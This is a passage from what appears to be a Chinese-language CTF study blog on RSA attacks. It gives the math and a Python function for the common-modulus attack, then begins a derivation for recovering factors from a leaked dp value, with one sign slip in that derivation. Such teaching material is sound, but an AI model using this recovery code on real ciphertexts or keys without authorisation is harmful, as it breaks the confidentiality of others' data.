class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><msubsup><mi>c</mi><mn>1</mn><mi>s</mi></msubsup><msubsup><mi>c</mi><mn>2</mn><mi>t</mi></msubsup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><msup><mi>m</mi><mrow><mi>s</mi><msub><mi>e</mi><mn>1</mn></msub></mrow></msup><msup><mi>m</mi><mrow><mi>t</mi><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><msup><mi>m</mi><mrow><mi>s</mi><msub><mi>e</mi><mn>1</mn></msub><mo>+</mo><mi>t</mi><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><mi>m</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}  c_1^sc_2^t &amp;\equiv m^{se_1}m^{te_2} \mod n \\&amp;\equiv m^{se_1+te_2} \mod n \\&amp;\equiv m \mod n \end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.5071em;vertical-align:-2.0036em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5036em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8436em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.1564em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span><span style="top:-1.6564em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.0036em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5036em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8436em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-3.1564em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8436em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">t</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-1.6564em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.0036em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>因此只要计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>c</mi><mn>1</mn><mi>s</mi></msubsup><msubsup><mi>c</mi><mn>2</mn><mi>t</mi></msubsup></mrow><annotation encoding="application/x-tex">c_1^sc_2^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0417em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7936em;"><span style="top:-2.4519em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span>即可得出明文c</p><p>此处贴上通解代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> primefac<br><br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">same_n_attack</span>(<span class="hljs-params">n,e1,e2,c1,c2</span>):<br>     <span class="hljs-keyword">def</span> <span class="hljs-title function_">egcd</span>(<span class="hljs-params">a,b</span>):<br>         x, lastX = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>         y, lastY = <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>         <span class="hljs-keyword">while</span> (b != <span class="hljs-number">0</span>):<br>             q = a // b<br>             a, b = b, a % b<br>             x, lastX = lastX - q * x, x<br>             y, lastY = lastY - q * y, y<br>         <span class="hljs-keyword">return</span> (lastX, lastY)<br>     s = egcd(e1,e2)<br>     s1 = s[<span class="hljs-number">0</span>]<br>     s2 = s[<span class="hljs-number">1</span>]<br>     <span class="hljs-keyword">if</span> s1 &lt; <span class="hljs-number">0</span>:<br>         s1 = -s1<br>         c1 = primefac.modinv(c1, n)<br>         <span class="hljs-keyword">if</span> c1 &lt; <span class="hljs-number">0</span>:<br>             c1 += n<br>     <span class="hljs-keyword">elif</span> s2 &lt; <span class="hljs-number">0</span>:<br>         s2 = -s2<br>         c2 = primefac.modinv(c2, n)<br>         <span class="hljs-keyword">if</span> c2 &lt; <span class="hljs-number">0</span>:<br>             c2 += n<br>     m = (<span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n)) % n<br>     <span class="hljs-keyword">return</span> m<br></code></pre></td></tr></table></figure><h2 id="dp泄露">dp泄露</h2><p>首先<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo>≡</mo><mi>d</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">dp \equiv d \mod (p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，这个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">dp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span></span></span>是比较重要的，因为其中蕴含了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>的信息，只要稍加推导就能得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>。</p><p>此时推导如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><mi>d</mi><mo>∗</mo><mi>e</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>d</mi><mo>∗</mo><mi>e</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mo>∗</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}  dp*e &amp;\equiv d*e \mod (p-1) \\ dp*e &amp;= d*e+k_1*(p-1) \\d*e &amp;= dp*e+k_1(p-1)\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.5em;vertical-align:-2em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>∗</mo><mi>e</mi><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d*e \equiv 1 \mod \varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4637em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，所以</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mi>k</mi><mn>2</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo>−</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo stretchy="false">(</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>−</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext>令</mtext><mo stretchy="false">(</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>−</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>为</mtext><mi>x</mi><mtext>，则该式变成</mtext><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>∗</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>x</mi><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned} dp*e+k_1(p-1) &amp;\equiv 1\mod \varphi(n)\\dp*e+k_1(p-1) &amp;\equiv 1\mod (p-1)(q-1)\\dp*e+k_1(p-1) &amp;= k_2*(p-1)(q-1)+1\\dp*e &amp;= k_2(p-1)(q-1)+1-k_1(p-1)\\dp*e &amp;= (k_2(q-1)-k_1)(p-1)+1    \\令(k_2(q-1)-k_1)&amp;为x，则该式变成:    \\dp*e &amp;= x(p-1)+1\end{aligned}</annotation></semantics></math></span><span class="katex-html" 